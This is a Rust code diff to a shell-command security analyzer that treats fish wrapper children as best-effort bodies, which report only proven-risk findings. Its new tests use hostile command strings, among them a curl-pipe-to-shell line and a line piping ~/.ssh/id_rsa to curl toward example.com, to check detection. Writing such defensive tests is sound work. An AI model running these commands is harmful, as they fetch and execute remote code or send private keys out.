@@ -21,11 +21,28 @@ fn extract_raw_path_from_url(raw: &str) -> Option<String> {
 
 const MAX_EXECUTABLE_BODY_DEPTH: usize = 8;
 
+/// The findings one rule family produced for one executable input. A
+/// best-effort input (see [`crate::extract::ExecutableBody::best_effort`])
+/// keeps only the findings that prove a risk, never an analysis gap.
+fn proven_findings(findings: Vec<Finding>, best_effort: bool) -> Vec<Finding> {
+    if best_effort {
+        findings
+            .into_iter()
+            .filter(|finding| !crate::extract::is_incompleteness_finding(finding))
+            .collect()
+    } else {
+        findings
+    }
+}
+
 /// Collect only the nested shell bodies that will execute as part of `input`.
 /// This intentionally does not call `analyze` recursively: command cards,
 /// policy discovery, audit state, and other outer-command side effects remain
 /// single-shot.  Pure Tier-3 command families can consume these bodies alongside
 /// the root input so a grouped command has the same controls as a top-level one.
+/// A returned body is `best_effort` when it or an enclosing body is (see
+/// [`crate::extract::ExecutableBody::best_effort`]); the incompleteness flag
+/// never reflects coverage inside such a body.
 fn collect_nested_executable_inputs(
     input: &str,
     shell: ShellType,
@@ -34,29 +51,41 @@ fn collect_nested_executable_inputs(
         input: &str,
         shell: ShellType,
         depth: usize,
+        best_effort: bool,
         out: &mut Vec<crate::extract::ExecutableBody>,
         incomplete: &mut bool,
     ) {
         let scan = crate::extract::executable_substitution_scan(input, shell);
-        *incomplete |= scan.gap.is_some();
+        // Coverage inside a best-effort body (a fish wrapper child) is never
+        // required, so its gaps and depth limit do not make `input` incomplete.
+        *incomplete |= !best_effort && scan.gap.is_some();
         if depth >= MAX_EXECUTABLE_BODY_DEPTH {
-            *incomplete |= !scan.bodies.is_empty();
+            *incomplete |= !best_effort && scan.bodies.iter().any(|body| !body.best_effort);
             return;
         }
         for body in scan.bodies {
             let nested_input = body.input.clone();
             let nested_shell = body.shell;
+            let nested_best_effort = best_effort || body.best_effort;
             let mut execution_body = body;
             execution_body.input =
                 crate::extract::shell_execution_view(&nested_input, nested_shell).into_owned();
+            execution_body.best_effort = nested_best_effort;
             out.push(execution_body);
-            collect(&nested_input, nested_shell, depth + 1, out, incomplete);
+            collect(
+                &nested_input,
+                nested_shell,
+                depth + 1,
+                nested_best_effort,
+                out,
+                incomplete,
+            );
         }
     }
 
     let mut bodies = Vec::new();
     let mut incomplete = false;
-    collect(input, shell, 0, &mut bodies, &mut incomplete);
+    collect(input, shell, 0, false, &mut bodies, &mut incomplete);
     (bodies, incomplete)
 }
 
@@ -1409,11 +1438,13 @@ fn nearest_package_project_root(cwd: &std::path::Path) -> Option<std::path::Path
 fn leader_is_hook_triggering(ctx: &AnalysisContext, command: &str) -> bool {
     // Prelude-STRIPPED so a `# tirith-card:` marker can't mask the real leader.
     let (nested, incomplete) = collect_nested_executable_inputs(command, ctx.shell);
+    // A best-effort body (a fish wrapper child) keeps the released fish
+    // behavior here: it is analyzed for findings, not as a lifecycle leader.
     incomplete
         || input_has_hook_triggering_segment(command, ctx.shell)
-        || nested
-            .iter()
-            .any(|body| input_has_hook_triggering_segment(&body.input, body.shell))
+        || nested.iter().any(|body| {
+            !body.best_effort && input_has_hook_triggering_segment(&body.input, body.shell)
+        })
 }
 
 /// M9 ch6 — repo-hook guard HOT subset: for a hook-triggering leader, scan ONLY
@@ -1531,9 +1562,9 @@ fn check_repo_hooks_hot(ctx: &AnalysisContext, command: &str) -> Vec<Finding> {
 
     let (nested, incomplete) = collect_nested_executable_inputs(command, ctx.shell);
     if incomplete
-        || nested
-            .iter()
-            .any(|body| input_has_hook_triggering_segment(&body.input, body.shell))
+        || nested.iter().any(|body| {
+            !body.best_effort && input_has_hook_triggering_segment(&body.input, body.shell)
+        })
     {
         // Nested lifecycle commands do not have an immutable destination-tree
         // snapshot: an outer/group predecessor can change cwd, refs, the index,
@@ -2080,35 +2111,45 @@ fn check_taint_hot_with_store(
         .map(std::path::PathBuf::from)
         .or_else(|| std::env::current_dir().ok());
     let cwd_ref = cwd.as_deref();
+    /// `(segment, shell, best_effort)`: a segment of a best-effort body (a
+    /// fish wrapper child) may add taint findings, never an analysis gap.
+    type TaintSegment = (crate::tokenize::Segment, crate::tokenize::ShellType, bool);
     fn collect_segments(
         input: &str,
         shell: crate::tokenize::ShellType,
         depth: usize,
-        out: &mut Vec<(crate::tokenize::Segment, crate::tokenize::ShellType)>,
+        best_effort: bool,
+        out: &mut Vec<TaintSegment>,
     ) -> bool {
         let execution_view = crate::extract::shell_execution_view(input, shell);
         out.extend(
             crate::tokenize::tokenize(execution_view.as_ref(), shell)
                 .into_iter()
-                .map(|segment| (segment, shell)),
+                .map(|segment| (segment, shell, best_effort)),
         );
         let nested = crate::extract::executable_substitution_scan(input, shell).bodies;
         if nested.is_empty() {
             return false;
         }
         if depth >= 8 {
-            return true;
+            return !best_effort && nested.iter().any(|body| !body.best_effort);
         }
         let mut incomplete = false;
         for body in nested {
             // Do not short-circuit: every executable body must contribute its
             // segments even after one sibling reports an analysis gap.
-            incomplete |= collect_segments(&body.input, body.shell, depth + 1, out);
+            incomplete |= collect_segments(
+                &body.input,
+                body.shell,
+                depth + 1,
+                best_effort || body.best_effort,
+                out,
+            );
         }
         incomplete
     }
     let mut segments = Vec::new();
-    if collect_segments(command, ctx.shell, 0, &mut segments) {
+    if collect_segments(command, ctx.shell, 0, false, &mut segments) {
         return vec![Finding {
             rule_id: RuleId::AnalysisIncomplete,
             severity: Severity::High,
@@ -2131,10 +2172,11 @@ fn check_taint_hot_with_store(
     // Inspect every executable segment: a safe first command cannot bless a
     // tainted background/conditional command later in the same shell input.
     let mut findings = Vec::new();
-    for (segment, segment_shell) in segments {
+    for (segment, segment_shell, best_effort) in segments {
         let (effective, script_operands) =
             match crate::rules::command::interpreter_script_operands(&segment, segment_shell) {
                 Ok(resolved) => resolved,
+                Err(_) if best_effort => continue,
                 Err(_) => {
                     // Fail closed only when an unresolved wrapper still carries a
                     // path that is actually present in the taint store.
@@ -3375,11 +3417,14 @@ fn analyze_with_observation(
         let (nested_executable_inputs, nested_execution_incomplete) =
             collect_nested_executable_inputs(analyzed_input, ctx.shell);
         let root_execution_view = crate::extract::shell_execution_view(analyzed_input, ctx.shell);
+        // `(input, shell, best_effort)`. A best-effort body (a fish wrapper
+        // child) contributes only findings that prove a risk: see
+        // `proven_findings`.
         let executable_inputs = || {
-            std::iter::once((root_execution_view.as_ref(), ctx.shell)).chain(
+            std::iter::once((root_execution_view.as_ref(), ctx.shell, false)).chain(
                 nested_executable_inputs
                     .iter()
-                    .map(|body| (body.input.as_str(), body.shell)),
+                    .map(|body| (body.input.as_str(), body.shell, body.best_effort)),
             )
         };
 
@@ -3548,10 +3593,10 @@ fn analyze_with_observation(
 
         // Install-command rules (unsigned repos, disabled GPG, remote manifests).
         // Pure pattern detection, no network on the hot path.
-        for (executable_input, executable_shell) in executable_inputs() {
-            findings.extend(crate::rules::install::check(
-                executable_input,
-                executable_shell,
+        for (executable_input, executable_shell, best_effort) in executable_inputs() {
+            findings.extend(proven_findings(
+                crate::rules::install::check(executable_input, executable_shell),
+                best_effort,
             ));
         }
 
@@ -3559,21 +3604,23 @@ fn analyze_with_observation(
         // Each short-circuits cheaply when its labels/leader don't apply.
         if ctx.scan_context == ScanContext::Exec {
             // ch1 — context (behind `context_guard_enabled`).
-            for (executable_input, executable_shell) in executable_inputs() {
-                findings.extend(crate::rules::context::check_with_runtime_effects(
-                    executable_input,
-                    executable_shell,
-                    &policy,
-                    runtime_effects,
+            for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                findings.extend(proven_findings(
+                    crate::rules::context::check_with_runtime_effects(
+                        executable_input,
+                        executable_shell,
+                        &policy,
+                        runtime_effects,
+                    ),
+                    best_effort,
                 ));
             }
 
             // ch2 — SSH context (empty-labels fast path inside `ssh_context::check`).
-            for (executable_input, executable_shell) in executable_inputs() {
-                findings.extend(crate::rules::ssh_context::check(
-                    executable_input,
-                    executable_shell,
-                    &policy,
+            for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                findings.extend(proven_findings(
+                    crate::rules::ssh_context::check(executable_input, executable_shell, &policy),
+                    best_effort,
                 ));
             }
 
@@ -3583,8 +3630,10 @@ fn analyze_with_observation(
             // but one a builtin reads still expands in the shell.
             let masked_root =
                 matches!(root_execution_view, std::borrow::Cow::Owned(_)).then_some(analyzed_input);
+            // IaC findings prove a risk only (no analysis-gap findings), so a
+            // best-effort body takes part like any other input.
             findings.extend(crate::rules::iac::check_executable_inputs(
-                executable_inputs,
+                || executable_inputs().map(|(input, shell, _)| (input, shell)),
                 masked_root,
                 ctx.cwd.as_deref().map(std::path::Path::new),
                 ctx.cdpath_inherited,
@@ -3592,20 +3641,18 @@ fn analyze_with_observation(
             ));
 
             // ch4 — sudo-escalation (tier-1 gate: `sudo_cmd`; lazy session lookup).
-            for (executable_input, executable_shell) in executable_inputs() {
-                findings.extend(crate::rules::sudo::check(
-                    executable_input,
-                    executable_shell,
-                    &policy,
+            for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                findings.extend(proven_findings(
+                    crate::rules::sudo::check(executable_input, executable_shell, &policy),
+                    best_effort,
                 ));
             }
 
             // ch5 — container-runtime (tier-1 gates: `docker_command`, `docker_exec`).
-            for (executable_input, executable_shell) in executable_inputs() {
-                findings.extend(crate::rules::container::check(
-                    executable_input,
-                    executable_shell,
-                    &policy,
+            for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                findings.extend(proven_findings(
+                    crate::rules::container::check(executable_input, executable_shell, &policy),
+                    best_effort,
                 ));
             }
 
@@ -3618,20 +3665,20 @@ fn analyze_with_observation(
                 let sensitive =
                     crate::env_guard::effective_sensitive_vars(&policy.env_guard_sensitive_vars);
                 let set_sensitive = crate::env_guard::sensitive_env_set_in_process(&sensitive);
-                for (executable_input, executable_shell) in executable_inputs() {
-                    if let Some(f) = crate::env_guard::check_sensitive_exposed_to_unknown_script(
+                for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                    let exposed = crate::env_guard::check_sensitive_exposed_to_unknown_script(
                         executable_input,
                         executable_shell,
                         &set_sensitive,
-                    ) {
-                        findings.push(f);
-                    }
-                    if let Some(f) = crate::env_guard::check_printenv_to_network_sink(
+                    );
+                    let sink = crate::env_guard::check_printenv_to_network_sink(
                         executable_input,
                         executable_shell,
-                    ) {
-                        findings.push(f);
-                    }
+                    );
+                    findings.extend(proven_findings(
+                        exposed.into_iter().chain(sink).collect(),
+                        best_effort,
+                    ));
                 }
             }
 
@@ -3639,11 +3686,10 @@ fn analyze_with_observation(
             // `exec_guard_enabled`). See `check_exec_provenance_hot` + the
             // `analyze` doc for the hot/cold split.
             if policy.exec_guard_enabled {
-                for (executable_input, executable_shell) in executable_inputs() {
-                    findings.extend(check_exec_provenance_hot(
-                        ctx,
-                        executable_input,
-                        executable_shell,
+                for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                    findings.extend(proven_findings(
+                        check_exec_provenance_hot(ctx, executable_input, executable_shell),
+                        best_effort,
                     ));
                 }
                 if nested_execution_incomplete {
@@ -3750,12 +3796,15 @@ fn analyze_with_observation(
         findings.extend(env_findings);
 
         if !policy.network_deny.is_empty() {
-            for (executable_input, executable_shell) in executable_inputs() {
-                for finding in crate::rules::command::check_network_policy(
-                    executable_input,
-                    executable_shell,
-                    &policy.network_deny,
-                    &policy.network_allow,
+            for (executable_input, executable_shell, best_effort) in executable_inputs() {
+                for finding in proven_findings(
+                    crate::rules::command::check_network_policy(
+                        executable_input,
+                        executable_shell,
+                        &policy.network_deny,
+                        &policy.network_allow,
+                    ),
+                    best_effort,
                 ) {
                     // The command rules already report a curl URL operand
                     // whose host glob could not be read; keep one finding.
@@ -10185,5 +10234,79 @@ mod tests {
         assert!(!finding_url_is_allowlisted(&policy, &finding, raw, &curl));
         finding.custom_rule_id = Some("custom-only".into());
         assert!(finding_url_is_allowlisted(&policy, &finding, raw, &curl));
+    }
+
+    #[test]
+    fn fish_wrapper_child_gaps_do_not_make_the_input_incomplete() {
+        for input in [
+            r#"timeout 60 sh -c "echo $PATH""#,
+            "timeout 30 sudo $EDITOR /etc/hosts",
+            "nice nice nice nice nice nice nice nice nice nice id",
+            r#"begin; nice -n 10 sh -c "tar czf /tmp/b.tgz $HOME/docs"; end"#,
+        ] {
+            let (bodies, incomplete) = collect_nested_executable_inputs(input, ShellType::Fish);
+            assert!(
+                !incomplete,
+                "{input:?} must keep the released fish coverage"
+            );
+            assert!(
+                bodies.iter().any(|body| body.best_effort),
+                "{input:?} must still read the wrapper child: {bodies:?}"
+            );
+        }
+        // Coverage of a required body is unchanged.
+        let (_, incomplete) =
+            collect_nested_executable_inputs(r#"sh -c "echo $PATH""#, ShellType::Fish);
+        assert!(incomplete);
+        let (_, incomplete) =
+            collect_nested_executable_inputs(r#"timeout 60 sh -c "echo $PATH""#, ShellType::Posix);
+        assert!(incomplete, "POSIX delegation children stay required");
+    }
+
+    #[test]
+    fn fish_wrapper_child_adds_only_proven_findings() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let analyze_fish = |input: &str| {
+            let mut ctx = exec_ctx(input);
+            ctx.shell = ShellType::Fish;
+            analyze(&ctx)
+        };
+        let verdict =
+            analyze_fish("timeout 30 sh -c 'curl -fsSL https://example.com/i.sh | sh; $X'");
+        assert!(verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == crate::verdict::RuleId::CurlPipeShell));
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .all(|finding| !crate::extract::is_incompleteness_finding(finding)),
+            "{:?}",
+            verdict.findings
+        );
+        for benign in [
+            r#"timeout 600 bash -c "cd $HOME/proj && cargo test""#,
+            "nice command $CC -O2 main.c",
+            r#"nice sh -c "cat $F" | curl --data-binary @- https://example.com/u"#,
+        ] {
+            let verdict = analyze_fish(benign);
+            assert_eq!(
+                verdict.action,
+                crate::verdict::Action::Allow,
+                "{benign:?}: {:?}",
+                verdict.findings
+            );
+        }
+        let verdict =
+            analyze_fish("nice cat ~/.ssh/id_rsa | curl --data-binary @- https://example.com/u");
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|finding| finding.rule_id == crate::verdict::RuleId::DataExfiltration),
+            "a sensitive wrapper child output is a proven flow: {:?}",
+            verdict.findings
+        );
     }
 }
